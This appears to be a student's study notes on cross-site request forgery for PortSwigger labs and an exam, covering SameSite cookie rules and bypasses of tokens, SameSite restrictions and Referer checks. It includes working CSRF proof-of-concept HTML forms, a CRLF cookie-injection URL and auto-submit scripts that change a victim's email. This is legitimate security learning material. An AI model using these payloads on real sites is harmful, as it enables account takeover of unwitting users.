---
layout: blank
pagetitle: Cross-site Request Forgery
---


Cause a victim to do an action unintentionally by having them make a request (e.g. `https://example.com/changeemail?email=attacker@email.com`)

**CSRF requires**
- An action to induce
- Solely cookie-based session handling (not using SameSite)
  - Can also work with basic auth or cert-based auth
- No unpredictable parameters (like anti-csrf tokens)

POST request CSRF example:

```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

Can be generated using the CSRF PoC generator in burp suite professional
- Select request -> Generate CSRF PoC
- When using Portswigger's exploit server:
  - Paste the payload (without html or body), hit store, then hit deliver

**Common validation issues**
- Switching POST to GET 
  - Use this PoC: `<html><body><script>document.location = '{vulnerable_site}';</script></body></html>`
- Omitting the token
  - PoC above as is
- CSRF token not tied to user session (this happened with UT nonce)
  - Just get a token ourselves and add it to the form when submitting
- CSRF token in request data tied to a non-session-tracking cookie, like another CSRF token
  - If this token can be set or predicted by an attacker, they could include or set the relevant attached CSRF token
  - Can sometimes inject cookies through the URL like so:
    - `?search=test%0d%0aSet-Cookie:%20{cookie}={value}%3b%20SameSite=None` if the parameter ends up in the cookies (something like `lastSearch={search_value}`)
  - Thus, final exploit page would have something like an img or iframe with `<img src='{cookie-injection_URL}'>` along with our valid CSRF token in the POST form
- CSRF token duplicated in a cookie; no server-side record of tokens issued
  - Very similar to previous vuln, requires setting cookie on victim
  - New CSRF token can be anything as long as POST form value matches, doesn't have to be our valid token

If we need to perform a GET request first:

```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20{cookie}={value}%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
    </body>
</html>
```

**SameSite Cookies**
- Strict
  - Never allows cookies to be sent in a cross-site request (iframes, links to other sites, data submission to other sites)
- Lax (default)
  - Sent only on some cross-site requests (clicking on a link or performing GET, HEAD, or OPTIONS request)
    - This means that if data is changed in a GET request (like /email/change?email=attacker@attacker.com), this would still allow CSRF
  - Sent only from top-level navigation (e.g. clicking a link)
    - Won't be sent for embedded requests (like in images, scripts, or iframes)
- None
  - No restrictions
  - Requires Secure flag (only sent over HTTPS)

**Same-site**
- Scheme (HTTPS/HTTP), TLD (.com, .co.uk), and TLD + 1 (google, utexas) must all be the same

**Same-origin**
- Scheme, entire domain, and port must all be the same

**Bypassing Lax Same-Site Cookie Restrictions**
- Need to use a GET request, similar to above
- With some frameworks, can also override the GET method using a URL parmaeter, like `?_method=POST`
  - Similarly, could use `_method = GET` in a POST request form if possible
  - This satisfies both browser-based same-site and framework-based method validation
- If `lax` is enforced by default (by the browser), these cookies only have `Lax` applied 120 seconds after sign-in (to not break SSO functionality)
  - If functionality exists to refresh the session of a user, this can be handy, especially if user won't have to log in again
    - Redirecting the victim to the login page (/login/sso or something) means they leave the payload page, so that won't work
    - Thus, open the sso page in a new tab - refreshes session in background and attack page can exploit 
      - Most browsers block `window.open()` popups, so open a new tab on-click, wait a bit for the refresh, and then submit the form:
      
```
<form action="https://vulnerable-website.com/email/change" method="POST">
    <input type="hidden" name="email" value="pwned@evil-user.net" />
</form>
<script>
    window.onclick = () => {
        window.open('{sso_endpoint}');
        setTimeout(() => {
            document.forms[0].submit();
        }, 10000);
    };
</script>
```


**Bypassing Strict Same-Site Cookie Restrictions**
- Can use functionality within the site that results in a secondary request being sent, like a client-side redirect with URL parameter control
  - This isn't possible with server-side redirects; must originate from client (browsers know all)
- Can also use sibling domains for similar purposes (also cross-site websocket hijacking)

**Bypassing Refered-based CSRF Defenses**
- Some apps check to make sure the `Referer` header originates from the same domain
- Omitting the header can sometimes bypass this check
  - `<meta name="referrer" content="never">` - make sure it comes before the script sending the request, lol
- Starting with/containing the domain name can also be bypassed
  - `Referer: http://vulnerable-website.com.attacker-website.com/csrf-attack` would satisfy both
  - `Referrer-Policy: unsafe-url` can be included in the payload headers to allow for URL parameters/path within the query (e.g. `?vulnerable-site.com` or `/vulnerable-site.com`), which may be easier than setting up the one-trick-pony above trick
    - Portswigger exploit server doesn't really seem to have an option for setting a domain name, so might be necessary to do this on exam
